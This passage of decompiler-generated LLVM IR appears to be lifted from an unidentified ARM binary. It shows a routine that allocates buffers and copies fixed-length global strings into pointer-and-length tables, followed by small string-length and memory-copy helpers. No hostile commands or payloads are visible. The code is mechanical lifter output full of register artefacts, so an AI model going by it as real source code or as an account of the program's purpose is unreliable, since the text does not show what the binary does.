  %v0_11ec8 = call i32 @function_13b88()
  %v0_11ed0 = load i32, i32* @sb, align 4
  store i32 %v0_11ec8, i32* @r5, align 4
  %v4_11ed8 = call i32 @function_124f0(i32 %v0_11ec8, i32 ptrtoint ([9 x i8]* @global_var_188a0.399 to i32), i32 %v0_11ed0)
  store i32 11, i32* @r0, align 4
  %v0_11ee0 = load i32, i32* @r5, align 4
  store i32 %v0_11ee0, i32* @global_var_23440.400, align 4
  %v0_11ee4 = load i32, i32* @sb, align 4
  %v1_11ee4 = trunc i32 %v0_11ee4 to i16
  store i16 %v1_11ee4, i16* bitcast (i32* @global_var_23444.401 to i16*), align 4
  %v0_11ee8 = call i32 @function_13b88()
  store i32 %v0_11ee8, i32* @r5, align 4
  %v4_11ef8 = call i32 @function_124f0(i32 %v0_11ee8, i32 ptrtoint ([12 x i8]* @global_var_188ac.403 to i32), i32 11)
  store i32 6, i32* @r0, align 4
  store i16 11, i16* bitcast (i32* @global_var_2344c.404 to i16*), align 4
  %v0_11f08 = load i32, i32* @r5, align 4
  store i32 %v0_11f08, i32* @global_var_23448.405, align 4
  %v0_11f0c = call i32 @function_13b88()
  store i32 %v0_11f0c, i32* @r5, align 4
  %v4_11f1c = call i32 @function_124f0(i32 %v0_11f0c, i32 ptrtoint ([7 x i8]* @global_var_188b8.407 to i32), i32 6)
  %v0_11f24 = load i32, i32* @r6, align 4
  store i32 %v0_11f24, i32* @r0, align 4
  %v0_11f28 = load i32, i32* @r5, align 4
  store i32 %v0_11f28, i32* @global_var_23460.408, align 4
  store i16 6, i16* bitcast (i32* @global_var_23464.409 to i16*), align 4
  %v0_11f30 = call i32 @function_13b88()
  %v0_11f34 = load i32, i32* @r6, align 4
  store i32 %v0_11f30, i32* @r5, align 4
  %v4_11f40 = call i32 @function_124f0(i32 %v0_11f30, i32 ptrtoint ([8 x i8]* @global_var_188c0.411 to i32), i32 %v0_11f34)
  %v0_11f44 = load i32, i32* @r6, align 4
  store i32 %v0_11f44, i32* @r0, align 4
  %v0_11f48 = load i32, i32* @r5, align 4
  store i32 %v0_11f48, i32* @global_var_23468.412, align 4
  %v1_11f4c = trunc i32 %v0_11f44 to i16
  store i16 %v1_11f4c, i16* bitcast (i32* @global_var_2346c.413 to i16*), align 4
  %v0_11f50 = call i32 @function_13b88()
  %v0_11f54 = load i32, i32* @r6, align 4
  store i32 %v0_11f50, i32* @r5, align 4
  %v4_11f60 = call i32 @function_124f0(i32 %v0_11f50, i32 ptrtoint ([8 x i8]* @global_var_188c8.415 to i32), i32 %v0_11f54)
  store i32 3, i32* @r0, align 4
  %v0_11f68 = load i32, i32* @r5, align 4
  store i32 %v0_11f68, i32* @global_var_23470.416, align 4
  %v0_11f6c = load i32, i32* @r6, align 4
  %v1_11f6c = trunc i32 %v0_11f6c to i16
  store i16 %v1_11f6c, i16* bitcast (i32* @global_var_23474.417 to i16*), align 4
  %v0_11f70 = call i32 @function_13b88()
  store i32 %v0_11f70, i32* @r5, align 4
  %v4_11f80 = call i32 @function_124f0(i32 %v0_11f70, i32 ptrtoint ([4 x i8]* @global_var_188d0.419 to i32), i32 3)
  store i32 19, i32* @r0, align 4
  store i16 3, i16* bitcast (i32* @global_var_2347c.420 to i16*), align 4
  %v0_11f90 = load i32, i32* @r5, align 4
  store i32 %v0_11f90, i32* @global_var_23478.421, align 4
  %v0_11f94 = call i32 @function_13b88()
  store i32 %v0_11f94, i32* @r5, align 4
  %v3_11fa4 = call i32 @function_124f0(i32 %v0_11f94, i32 ptrtoint (i32* @global_var_188d4.423 to i32), i32 19)
  store i32 24, i32* @r0, align 4
  %v0_11fb0 = load i32, i32* @r5, align 4
  store i32 %v0_11fb0, i32* @global_var_23480.424, align 4
  store i16 19, i16* bitcast (i32* @global_var_23484.425 to i16*), align 4
  %v0_11fb8 = call i32 @function_13b88()
  store i32 %v0_11fb8, i32* @r5, align 4
  %v3_11fc8 = call i32 @function_124f0(i32 %v0_11fb8, i32 ptrtoint (i32* @global_var_188e8.427 to i32), i32 24)
  store i32 9, i32* @r0, align 4
  store i16 24, i16* bitcast (i32* @global_var_2348c.428 to i16*), align 4
  %v0_11fd8 = load i32, i32* @r5, align 4
  store i32 %v0_11fd8, i32* @global_var_23488.429, align 4
  %v0_11fdc = call i32 @function_13b88()
  store i32 %v0_11fdc, i32* @r5, align 4
  store i32 9, i32* @sl, align 4
  %v4_11ff0 = call i32 @function_124f0(i32 %v0_11fdc, i32 ptrtoint ([10 x i8]* @global_var_18904.431 to i32), i32 9)
  store i32 16, i32* @r0, align 4
  %v0_11ff8 = load i32, i32* @r5, align 4
  store i32 %v0_11ff8, i32* @global_var_23490.432, align 4
  %v0_11ffc = load i32, i32* @sl, align 4
  %v1_11ffc = trunc i32 %v0_11ffc to i16
  store i16 %v1_11ffc, i16* bitcast (i32* @global_var_23494.433 to i16*), align 4
  %v0_12000 = call i32 @function_13b88()
  store i32 %v0_12000, i32* @r5, align 4
  store i32 16, i32* @fp, align 4
  %v3_12014 = call i32 @function_124f0(i32 %v0_12000, i32 ptrtoint (i32* @global_var_18910.435 to i32), i32 16)
  store i32 22, i32* @r0, align 4
  %v0_1201c = load i32, i32* @r5, align 4
  store i32 %v0_1201c, i32* @global_var_23498.436, align 4
  %v0_12020 = load i32, i32* @fp, align 4
  %v1_12020 = trunc i32 %v0_12020 to i16
  store i16 %v1_12020, i16* bitcast (i32* @global_var_2349c.437 to i16*), align 4
  %v0_12024 = call i32 @function_13b88()
  store i32 %v0_12024, i32* @r5, align 4
  %v3_12034 = call i32 @function_124f0(i32 %v0_12024, i32 ptrtoint (i32* @global_var_18924.439 to i32), i32 22)
  store i32 21, i32* @r0, align 4
  %v0_12040 = load i32, i32* @r5, align 4
  store i32 %v0_12040, i32* @global_var_234a0.440, align 4
  store i16 22, i16* bitcast (i32* @global_var_234a4.441 to i16*), align 4
  %v0_12048 = call i32 @function_13b88()
  store i32 %v0_12048, i32* @r5, align 4
  %v3_12058 = call i32 @function_124f0(i32 %v0_12048, i32 ptrtoint (i32* @global_var_1893c.443 to i32), i32 21)
  %v0_12060 = load i32, i32* @r8, align 4
  store i32 %v0_12060, i32* @r0, align 4
  store i16 21, i16* bitcast (i32* @global_var_234ac.444 to i16*), align 4
  %v0_12068 = load i32, i32* @r5, align 4
  store i32 %v0_12068, i32* @global_var_234a8.445, align 4
  %v0_1206c = call i32 @function_13b88()
  %v0_12074 = load i32, i32* @r8, align 4
  store i32 %v0_1206c, i32* @r5, align 4
  %v4_1207c = call i32 @function_124f0(i32 %v0_1206c, i32 ptrtoint ([18 x i8]* @global_var_18954.447 to i32), i32 %v0_12074)
  store i32 12, i32* @r0, align 4
  %v0_12084 = load i32, i32* @r5, align 4
  store i32 %v0_12084, i32* @global_var_234b0.448, align 4
  %v0_12088 = load i32, i32* @r8, align 4
  %v1_12088 = trunc i32 %v0_12088 to i16
  store i16 %v1_12088, i16* bitcast (i32* @global_var_234b4.449 to i16*), align 4
  %v0_1208c = call i32 @function_13b88()
  %v0_12098 = load i32, i32* @r6, align 4
  %v1_12098 = add i32 %v0_12098, 5
  store i32 %v1_12098, i32* @r6, align 4
  store i32 %v0_1208c, i32* @r5, align 4
  %v3_120a0 = call i32 @function_124f0(i32 %v0_1208c, i32 ptrtoint (i32* @global_var_18968.451 to i32), i32 12)
  store i32 23, i32* @r0, align 4
  %v0_120a8 = load i32, i32* @r5, align 4
  store i32 %v0_120a8, i32* @global_var_234b8.452, align 4
  %v0_120ac = load i32, i32* @r6, align 4
  %v1_120ac = trunc i32 %v0_120ac to i16
  store i16 %v1_120ac, i16* bitcast (i32* @global_var_234bc.453 to i16*), align 4
  %v0_120b0 = call i32 @function_13b88()
  store i32 %v0_120b0, i32* @r5, align 4
  %v3_120c0 = call i32 @function_124f0(i32 %v0_120b0, i32 ptrtoint (i32* @global_var_18978.455 to i32), i32 23)
  store i32 83, i32* @r0, align 4
  %v2_120d0 = load i32, i32* @r4, align 4
  %v4_120d0 = add i32 %v2_120d0, 260
  %v5_120d0 = inttoptr i32 %v4_120d0 to i16*
  store i16 23, i16* %v5_120d0, align 2
  %v0_120d4 = load i32, i32* @r5, align 4
  store i32 %v0_120d4, i32* @global_var_234c0.456, align 4
  %v0_120d8 = call i32 @function_13b88()
  store i32 %v0_120d8, i32* @r5, align 4
  %v3_120e8 = call i32 @function_124f0(i32 %v0_120d8, i32 ptrtoint (i32* @global_var_18990.458 to i32), i32 83)
  store i32 32, i32* @r0, align 4
  %v2_120f8 = load i32, i32* @r4, align 4
  %v4_120f8 = add i32 %v2_120f8, 268
  %v5_120f8 = inttoptr i32 %v4_120f8 to i16*
  store i16 83, i16* %v5_120f8, align 2
  %v0_120fc = load i32, i32* @r5, align 4
  store i32 %v0_120fc, i32* @global_var_234c8.459, align 4
  %v0_12100 = call i32 @function_13b88()
  store i32 %v0_12100, i32* @r5, align 4
  %v3_12110 = call i32 @function_124f0(i32 %v0_12100, i32 ptrtoint (i32* @global_var_189e4.461 to i32), i32 32)
  store i32 48, i32* @r0, align 4
  %v2_12120 = load i32, i32* @r4, align 4
  %v4_12120 = add i32 %v2_12120, 276
  %v5_12120 = inttoptr i32 %v4_12120 to i16*
  store i16 32, i16* %v5_12120, align 2
  %v0_12124 = load i32, i32* @r5, align 4
  store i32 %v0_12124, i32* @global_var_234d0.462, align 4
  %v0_12128 = call i32 @function_13b88()
  store i32 %v0_12128, i32* @r5, align 4
  %v3_12138 = call i32 @function_124f0(i32 %v0_12128, i32 ptrtoint (i32* @global_var_18a08.464 to i32), i32 48)
  %v0_12144 = load i32, i32* @r6, align 4
  store i32 %v0_12144, i32* @r0, align 4
  %v2_12148 = load i32, i32* @r4, align 4
  %v4_12148 = add i32 %v2_12148, 284
  %v5_12148 = inttoptr i32 %v4_12148 to i16*
  store i16 48, i16* %v5_12148, align 2
  %v0_1214c = load i32, i32* @r5, align 4
  store i32 %v0_1214c, i32* @global_var_234d8.465, align 4
  %v0_12150 = call i32 @function_13b88()
  %v0_12154 = load i32, i32* @r6, align 4
  store i32 %v0_12150, i32* @r5, align 4
  %v3_12160 = call i32 @function_124f0(i32 %v0_12150, i32 ptrtoint (i32* @global_var_18a3c.467 to i32), i32 %v0_12154)
  %v0_12168 = load i32, i32* @sl, align 4
  store i32 %v0_12168, i32* @r0, align 4
  %v0_1216c = load i32, i32* @r6, align 4
  %v1_1216c = trunc i32 %v0_1216c to i16
  %v2_1216c = load i32, i32* @r4, align 4
  %v4_1216c = add i32 %v2_1216c, 292
  %v5_1216c = inttoptr i32 %v4_1216c to i16*
  store i16 %v1_1216c, i16* %v5_1216c, align 2
  %v0_12170 = load i32, i32* @r5, align 4
  store i32 %v0_12170, i32* @global_var_234e0.468, align 4
  %v0_12174 = call i32 @function_13b88()
  %v0_1217c = load i32, i32* @sl, align 4
  store i32 %v0_12174, i32* @r5, align 4
  %v3_12184 = call i32 @function_124f0(i32 %v0_12174, i32 ptrtoint (i32* @global_var_18a4c.470 to i32), i32 %v0_1217c)
  %v0_1218c = load i32, i32* @r7, align 4
  store i32 %v0_1218c, i32* @r0, align 4
  %v0_12190 = load i32, i32* @sl, align 4
  %v1_12190 = trunc i32 %v0_12190 to i16
  %v2_12190 = load i32, i32* @r4, align 4
  %v4_12190 = add i32 %v2_12190, 300
  %v5_12190 = inttoptr i32 %v4_12190 to i16*
  store i16 %v1_12190, i16* %v5_12190, align 2
  %v0_12194 = load i32, i32* @r5, align 4
  store i32 %v0_12194, i32* @global_var_234e8.471, align 4
  %v0_12198 = call i32 @function_13b88()
  %v0_121a0 = load i32, i32* @r7, align 4
  store i32 %v0_12198, i32* @r5, align 4
  %v3_121a8 = call i32 @function_124f0(i32 %v0_12198, i32 ptrtoint (i32* @global_var_18a58.473 to i32), i32 %v0_121a0)
  %v0_121b0 = load i32, i32* @r6, align 4
  store i32 %v0_121b0, i32* @r0, align 4
  %v0_121b4 = load i32, i32* @r7, align 4
  %v1_121b4 = trunc i32 %v0_121b4 to i16
  %v2_121b4 = load i32, i32* @r4, align 4
  %v4_121b4 = add i32 %v2_121b4, 308
  %v5_121b4 = inttoptr i32 %v4_121b4 to i16*
  store i16 %v1_121b4, i16* %v5_121b4, align 2
  %v0_121b8 = load i32, i32* @r5, align 4
  store i32 %v0_121b8, i32* @global_var_234f0.474, align 4
  %v0_121bc = call i32 @function_13b88()
  %v0_121c0 = load i32, i32* @r6, align 4
  store i32 %v0_121bc, i32* @r5, align 4
  %v3_121cc = call i32 @function_124f0(i32 %v0_121bc, i32 ptrtoint (i32* @global_var_18a64.476 to i32), i32 %v0_121c0)
  %v0_121d4 = load i32, i32* @fp, align 4
  store i32 %v0_121d4, i32* @r0, align 4
  %v0_121d8 = load i32, i32* @r6, align 4
  %v1_121d8 = trunc i32 %v0_121d8 to i16
  %v2_121d8 = load i32, i32* @r4, align 4
  %v4_121d8 = add i32 %v2_121d8, 316
  %v5_121d8 = inttoptr i32 %v4_121d8 to i16*
  store i16 %v1_121d8, i16* %v5_121d8, align 2
  %v0_121dc = load i32, i32* @r5, align 4
  store i32 %v0_121dc, i32* @global_var_234f8.477, align 4
  %v0_121e0 = call i32 @function_13b88()
  %v0_121e8 = load i32, i32* @fp, align 4
  store i32 %v0_121e0, i32* @r5, align 4
  %v3_121f0 = call i32 @function_124f0(i32 %v0_121e0, i32 ptrtoint (i32* @global_var_18a74.479 to i32), i32 %v0_121e8)
  store i32 19, i32* @r0, align 4
  %v0_121fc = load i32, i32* @fp, align 4
  %v1_121fc = trunc i32 %v0_121fc to i16
  %v2_121fc = load i32, i32* @r4, align 4
  %v4_121fc = add i32 %v2_121fc, 324
  %v5_121fc = inttoptr i32 %v4_121fc to i16*
  store i16 %v1_121fc, i16* %v5_121fc, align 2
  %v0_12200 = load i32, i32* @r5, align 4
  store i32 %v0_12200, i32* @global_var_23500.480, align 4
  %v0_12204 = call i32 @function_13b88()
  store i32 %v0_12204, i32* @r5, align 4
  %v3_12214 = call i32 @function_124f0(i32 %v0_12204, i32 ptrtoint (i32* @global_var_18a88.482 to i32), i32 19)
  %v0_12220 = load i32, i32* @sb, align 4
  store i32 %v0_12220, i32* @r0, align 4
  %v2_12224 = load i32, i32* @r4, align 4
  %v4_12224 = add i32 %v2_12224, 332
  %v5_12224 = inttoptr i32 %v4_12224 to i16*
  store i16 19, i16* %v5_12224, align 2
  %v0_12228 = load i32, i32* @r5, align 4
  store i32 %v0_12228, i32* @global_var_23508.483, align 4
  %v0_1222c = call i32 @function_13b88()
  %v0_12234 = load i32, i32* @sb, align 4
  store i32 %v0_1222c, i32* @r5, align 4
  %v4_1223c = call i32 @function_124f0(i32 %v0_1222c, i32 ptrtoint ([9 x i8]* @global_var_18a9c.485 to i32), i32 %v0_12234)
  store i32 11, i32* @r0, align 4
  %v0_12248 = load i32, i32* @sb, align 4
  %v1_12248 = trunc i32 %v0_12248 to i16
  %v2_12248 = load i32, i32* @r4, align 4
  %v4_12248 = add i32 %v2_12248, 340
  %v5_12248 = inttoptr i32 %v4_12248 to i16*
  store i16 %v1_12248, i16* %v5_12248, align 2
  %v0_1224c = load i32, i32* @r5, align 4
  store i32 %v0_1224c, i32* @global_var_23510.486, align 4
  %v0_12250 = call i32 @function_13b88()
  store i32 %v0_12250, i32* @r5, align 4
  %v3_12260 = call i32 @function_124f0(i32 %v0_12250, i32 ptrtoint (i32* @global_var_18984.488 to i32), i32 11)
  %v0_1226c = load i32, i32* @r6, align 4
  store i32 %v0_1226c, i32* @r0, align 4
  %v2_12270 = load i32, i32* @r4, align 4
  %v4_12270 = add i32 %v2_12270, 348
  %v5_12270 = inttoptr i32 %v4_12270 to i16*
  store i16 11, i16* %v5_12270, align 2
  %v0_12274 = load i32, i32* @r5, align 4
  store i32 %v0_12274, i32* @global_var_23518.489, align 4
  %v0_12278 = call i32 @function_13b88()
  %v0_1227c = load i32, i32* @r6, align 4
  store i32 %v0_12278, i32* @r5, align 4
  %v3_12288 = call i32 @function_124f0(i32 %v0_12278, i32 ptrtoint (i32* @global_var_18aa8.491 to i32), i32 %v0_1227c)
  store i32 18, i32* @r0, align 4
  %v0_12294 = load i32, i32* @r6, align 4
  %v1_12294 = trunc i32 %v0_12294 to i16
  %v2_12294 = load i32, i32* @r4, align 4
  %v4_12294 = add i32 %v2_12294, 356
  %v5_12294 = inttoptr i32 %v4_12294 to i16*
  store i16 %v1_12294, i16* %v5_12294, align 2
  %v0_12298 = load i32, i32* @r5, align 4
  store i32 %v0_12298, i32* @global_var_23520.492, align 4
  %v0_1229c = call i32 @function_13b88()
  store i32 %v0_1229c, i32* @r5, align 4
  %v3_122ac = call i32 @function_124f0(i32 %v0_1229c, i32 ptrtoint (i32* @global_var_18ab8.494 to i32), i32 18)
  store i32 25, i32* @r0, align 4
  %v2_122bc = load i32, i32* @r4, align 4
  %v4_122bc = add i32 %v2_122bc, 364
  %v5_122bc = inttoptr i32 %v4_122bc to i16*
  store i16 18, i16* %v5_122bc, align 2
  %v0_122c0 = load i32, i32* @r5, align 4
  store i32 %v0_122c0, i32* @global_var_23528.495, align 4
  %v0_122c4 = call i32 @function_13b88()
  store i32 %v0_122c4, i32* %r5.global-to-local, align 4
  %v3_122d4 = call i32 @function_124f0(i32 %v0_122c4, i32 ptrtoint (i32* @global_var_18acc.497 to i32), i32 25)
  store i32 111, i32* @r0, align 4
  %v2_122e4 = load i32, i32* @r4, align 4
  %v4_122e4 = add i32 %v2_122e4, 372
  %v5_122e4 = inttoptr i32 %v4_122e4 to i16*
  store i16 25, i16* %v5_122e4, align 2
  %v0_122e8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_122e8, i32* @global_var_23530.498, align 4
  %v0_122ec = load i32, i32* @r0, align 4
  store i32 %v0_122ec, i32* @r5, align 4
  %v0_122f0 = call i32 @function_13b88()
  %v0_122f4 = load i32, i32* @r5, align 4
  store i32 %v0_122f0, i32* @r6, align 4
  %v3_12300 = call i32 @function_124f0(i32 %v0_122f0, i32 ptrtoint (i32* @global_var_18ae8.500 to i32), i32 %v0_122f4)
  %v0_12308 = load i32, i32* @r5, align 4
  store i32 %v0_12308, i32* @r0, align 4
  %v1_1230c = trunc i32 %v0_12308 to i16
  %v2_1230c = load i32, i32* @r4, align 4
  %v4_1230c = add i32 %v2_1230c, 380
  %v5_1230c = inttoptr i32 %v4_1230c to i16*
  store i16 %v1_1230c, i16* %v5_1230c, align 2
  %v0_12310 = load i32, i32* @r6, align 4
  store i32 %v0_12310, i32* @global_var_23538.501, align 4
  %v0_12314 = call i32 @function_13b88()
  %v0_12318 = load i32, i32* @r5, align 4
  store i32 %v0_12314, i32* @r6, align 4
  %v3_12324 = call i32 @function_124f0(i32 %v0_12314, i32 ptrtoint (i32* @global_var_18b58.503 to i32), i32 %v0_12318)
  store i32 110, i32* @r0, align 4
  %v0_12330 = load i32, i32* @r5, align 4
  %v1_12330 = trunc i32 %v0_12330 to i16
  %v2_12330 = load i32, i32* @r4, align 4
  %v4_12330 = add i32 %v2_12330, 388
  %v5_12330 = inttoptr i32 %v4_12330 to i16*
  store i16 %v1_12330, i16* %v5_12330, align 2
  %v0_12334 = load i32, i32* @r6, align 4
  store i32 %v0_12334, i32* @global_var_23540.504, align 4
  %v0_12338 = load i32, i32* @r0, align 4
  store i32 %v0_12338, i32* @r5, align 4
  %v0_1233c = call i32 @function_13b88()
  %v0_12340 = load i32, i32* @r5, align 4
  store i32 %v0_1233c, i32* @r6, align 4
  %v3_1234c = call i32 @function_124f0(i32 %v0_1233c, i32 ptrtoint (i32* @global_var_18bc8.506 to i32), i32 %v0_12340)
  %v0_12354 = load i32, i32* @r5, align 4
  store i32 %v0_12354, i32* @r0, align 4
  %v1_12358 = trunc i32 %v0_12354 to i16
  %v2_12358 = load i32, i32* @r4, align 4
  %v4_12358 = add i32 %v2_12358, 396
  %v5_12358 = inttoptr i32 %v4_12358 to i16*
  store i16 %v1_12358, i16* %v5_12358, align 2
  %v0_1235c = load i32, i32* @r6, align 4
  store i32 %v0_1235c, i32* @global_var_23548.507, align 4
  %v0_12360 = call i32 @function_13b88()
  %v0_12364 = load i32, i32* @r5, align 4
  store i32 %v0_12360, i32* @r6, align 4
  %v3_12370 = call i32 @function_124f0(i32 %v0_12360, i32 ptrtoint (i32* @global_var_18c38.509 to i32), i32 %v0_12364)
  store i32 117, i32* @r0, align 4
  %v0_1237c = load i32, i32* @r5, align 4
  %v1_1237c = trunc i32 %v0_1237c to i16
  %v2_1237c = load i32, i32* @r4, align 4
  %v4_1237c = add i32 %v2_1237c, 404
  %v5_1237c = inttoptr i32 %v4_1237c to i16*
  store i16 %v1_1237c, i16* %v5_1237c, align 2
  %v0_12380 = load i32, i32* @r6, align 4
  store i32 %v0_12380, i32* @global_var_23550.510, align 4
  %v0_12384 = call i32 @function_13b88()
  store i32 %v0_12384, i32* %r5.global-to-local, align 4
  %v3_12394 = call i32 @function_124f0(i32 %v0_12384, i32 ptrtoint (i32* @global_var_18ca8.512 to i32), i32 117)
  store i32 %v0_12384, i32* @global_var_23558.513, align 4
  %v2_123a4 = load i32, i32* @r4, align 4
  %v4_123a4 = add i32 %v2_123a4, 412
  %v5_123a4 = inttoptr i32 %v4_123a4 to i16*
  store i16 117, i16* %v5_123a4, align 2
  store i32 %v6_11c88, i32* %r5.global-to-local, align 4
  ret i32 %v3_12394

; uselistorder directives
  uselistorder i32 %v0_12360, { 1, 0 }
  uselistorder i32 %v0_1233c, { 1, 0 }
  uselistorder i32 %v0_12314, { 1, 0 }
  uselistorder i32 %v0_122f0, { 1, 0 }
  uselistorder i32 %v0_12278, { 1, 0 }
  uselistorder i32 %v0_1222c, { 1, 0 }
  uselistorder i32 %v0_121e0, { 1, 0 }
  uselistorder i32 %v0_121bc, { 1, 0 }
  uselistorder i32 %v0_12198, { 1, 0 }
  uselistorder i32 %v0_12174, { 1, 0 }
  uselistorder i32 %v0_12150, { 1, 0 }
  uselistorder i32 %v0_1208c, { 1, 0 }
  uselistorder i32 %v0_1206c, { 1, 0 }
  uselistorder i32 %v0_11f50, { 1, 0 }
  uselistorder i32 %v0_11f30, { 1, 0 }
  uselistorder i32 %v0_11ec8, { 1, 0 }
  uselistorder i32 %v0_11e84, { 1, 0 }
  uselistorder i32 %v0_11e64, { 1, 0 }
  uselistorder i32 %v0_11e18, { 1, 0 }
  uselistorder i32 %v0_11df8, { 1, 0 }
  uselistorder i32 %v0_11d68, { 1, 0 }
  uselistorder i32 %v0_11d00, { 1, 0 }
  uselistorder i32 %v0_11ce0, { 1, 0 }
  uselistorder i32 %v0_11cbc, { 1, 0 }
  uselistorder i32 %v0_11c94, { 1, 0 }
  uselistorder i32 284, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32 23, { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 21, { 1, 6, 2, 7, 3, 8, 4, 9, 10, 5, 0, 11 }
  uselistorder i32 29, { 0, 5, 6, 3, 1, 2, 4 }
  uselistorder i32 (i32, i32, i32)* @function_124f0, { 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 2, 1, 9, 8, 7, 6, 5, 4, 3, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_233c0.328 to i32), { 4, 0, 1, 2, 3, 5 }
  uselistorder label %dec_label_pc_11c84._crit_edge, { 1, 0 }
}

define i32 @function_12480(i8* %arg1) local_unnamed_addr {
dec_label_pc_12480:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_12484 = load i8, i8* %arg1, align 1
  %v2_12488 = icmp eq i8 %v3_12484, 0
  %v0_1248c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12488, i32 %v0_1248c)
  br label %dec_label_pc_12494

dec_label_pc_12494:                               ; preds = %dec_label_pc_12494, %dec_label_pc_12480
  %v0_12494 = phi i32 [ %v1_12494, %dec_label_pc_12494 ], [ 0, %dec_label_pc_12480 ]
  %v1_12494 = add i32 %v0_12494, 1
  %v2_12498 = add i32 %v1_12494, %tmp
  %v3_12498 = inttoptr i32 %v2_12498 to i8*
  %v4_12498 = load i8, i8* %v3_12498, align 1
  %v6_12498 = zext i8 %v4_12498 to i32
  store i32 %v6_12498, i32* @r3, align 4
  %v2_1249c = icmp eq i8 %v4_12498, 0
  br i1 %v2_1249c, label %dec_label_pc_124a4, label %dec_label_pc_12494

dec_label_pc_124a4:                               ; preds = %dec_label_pc_12494
  ret i32 %v1_12494
}

define i32 @function_124a8(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_124a8:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_124a8 = load i8, i8* %arg1, align 1
  %v3_124a8 = zext i8 %v2_124a8 to i32
  store i32 %v3_124a8, i32* @r2, align 4
  %v2_124ac = icmp eq i8 %v2_124a8, 0
  br i1 %v2_124ac, label %bb, label %dec_label_pc_124b8

bb:                                               ; preds = %dec_label_pc_124a8
  store i32 %v3_124a8, i32* @ip, align 4
  br label %dec_label_pc_124cc

dec_label_pc_124b8:                               ; preds = %dec_label_pc_124a8
  br label %dec_label_pc_124bc

dec_label_pc_124bc:                               ; preds = %dec_label_pc_124bc, %dec_label_pc_124b8
  %v0_124bc = phi i32 [ %v1_124bc, %dec_label_pc_124bc ], [ 0, %dec_label_pc_124b8 ]
  %v1_124bc = add i32 %v0_124bc, 1
  store i32 %v1_124bc, i32* @ip, align 4
  %v2_124c0 = add i32 %v1_124bc, %tmp
  %v3_124c0 = inttoptr i32 %v2_124c0 to i8*
  %v4_124c0 = load i8, i8* %v3_124c0, align 1
  %v2_124c4 = icmp eq i8 %v4_124c0, 0
  br i1 %v2_124c4, label %dec_label_pc_124cc, label %dec_label_pc_124bc

dec_label_pc_124cc:                               ; preds = %dec_label_pc_124bc, %bb
  %v0_124cc = phi i32 [ %v3_124a8, %bb ], [ %v1_124bc, %dec_label_pc_124bc ]
  br label %dec_label_pc_124d8

dec_label_pc_124d4:                               ; preds = %dec_label_pc_124d8
  %v0_124d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_124d4 = add i32 %v0_124d4, 1
  %v2_124d4 = inttoptr i32 %v1_124d4 to i8*
  %v3_124d4 = load i8, i8* %v2_124d4, align 1
  %v4_124d4 = zext i8 %v3_124d4 to i32
  store i32 %v4_124d4, i32* @r2, align 4
  store i32 %v1_124d4, i32* %r1.global-to-local, align 4
  %v0_124d8.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_124d8

dec_label_pc_124d8:                               ; preds = %dec_label_pc_124cc, %dec_label_pc_124d4
  %v0_124e0.off0 = phi i8 [ %v2_124a8, %dec_label_pc_124cc ], [ %v3_124d4, %dec_label_pc_124d4 ]
  %v0_124d8 = phi i32 [ %v0_124cc, %dec_label_pc_124cc ], [ %v0_124d8.pr, %dec_label_pc_124d4 ]
  %v1_124d8 = add i32 %v0_124d8, -1
  store i32 %v1_124d8, i32* @r3, align 4
  %v3_124dc = icmp eq i32 %v0_124d8, 0
  %v2_124e0 = load i32, i32* @r0, align 4
  %v3_124e0 = inttoptr i32 %v2_124e0 to i8*
  store i8 %v0_124e0.off0, i8* %v3_124e0, align 1
  %v4_124e0 = load i32, i32* @r0, align 4
  %v5_124e0 = add i32 %v4_124e0, 1
  store i32 %v5_124e0, i32* @r0, align 4
  br i1 %v3_124dc, label %dec_label_pc_124e8, label %dec_label_pc_124d4

dec_label_pc_124e8:                               ; preds = %dec_label_pc_124d8
  %v0_124e8 = load i32, i32* @ip, align 4
  ret i32 %v0_124e8

; uselistorder directives
  uselistorder i32 %v0_124d8, { 1, 0 }
  uselistorder i32 %v1_124bc, { 0, 1, 3, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_124d8, { 1, 0 }
}

define i32 @function_124f0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_124f0:
  %v2_124f0 = icmp eq i32 %arg3, 0
  %v0_124f4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_124f0, i32 %v0_124f4)
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_124fc

dec_label_pc_124fc:                               ; preds = %dec_label_pc_124fc, %dec_label_pc_124f0
  %v0_124fc = phi i32 [ %v1_12504, %dec_label_pc_124fc ], [ 0, %dec_label_pc_124f0 ]
  %v2_124fc = add i32 %v0_124fc, %arg2
  %v3_124fc = inttoptr i32 %v2_124fc to i8*
  %v4_124fc = load i8, i8* %v3_124fc, align 1
  %v4_12500 = add i32 %v0_124fc, %arg1
  %v5_12500 = inttoptr i32 %v4_12500 to i8*
  store i8 %v4_124fc, i8* %v5_12500, align 1
  %v0_12504 = load i32, i32* @ip, align 4
  %v1_12504 = add i32 %v0_12504, 1
  store i32 %v1_12504, i32* @ip, align 4
  %v9_12508 = icmp eq i32 %v1_12504, %arg3
  br i1 %v9_12508, label %dec_label_pc_12510, label %dec_label_pc_124fc

dec_label_pc_12510:                               ; preds = %dec_label_pc_124fc
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_12504, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_12514(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12514:
  %r2.global-to-local = alloca i32, align 4
  %v2_12514 = icmp eq i32 %arg2, 0
  %v0_12518 = load i32, i32* @lr, align 4
